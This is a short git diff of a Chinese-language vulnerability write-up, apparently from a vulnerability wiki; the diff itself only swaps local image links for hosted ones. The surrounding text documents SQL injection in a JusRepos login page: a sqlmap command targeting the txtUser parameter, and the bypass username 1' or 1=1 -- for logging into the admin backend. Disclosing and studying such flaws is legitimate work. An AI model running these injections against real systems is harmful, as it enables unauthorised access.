@@ -20,7 +20,7 @@
 
 进入页面如下
 
-![](image/fy-1.png)
+![](http://wikioss.peiqi.tech/vuln/fy-1.png)
 
 出现漏洞的Url为
 
@@ -28,7 +28,7 @@
 http://xxxxxxx/JusRepos/ui/login.aspx
 ```
 
-![](image/fy-2.png)
+![](http://wikioss.peiqi.tech/vuln/fy-2.png)
 
 抓取登录的请求包
 
@@ -59,7 +59,7 @@ __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTE4NTUyMzg5NDNkZBLjR6E85W
 sqlmap -r sql.txt -p txtUser
 ```
 
-![](image/fy-3.png)
+![](http://wikioss.peiqi.tech/vuln/fy-3.png)
 
 同时还存在着万能密码可以直接登录后台
 
@@ -68,4 +68,4 @@ user: 1' or 1=1 --
 pass: peiqi
 ```
 
-![](image/fy-7.png)
+![](http://wikioss.peiqi.tech/vuln/fy-7.png)
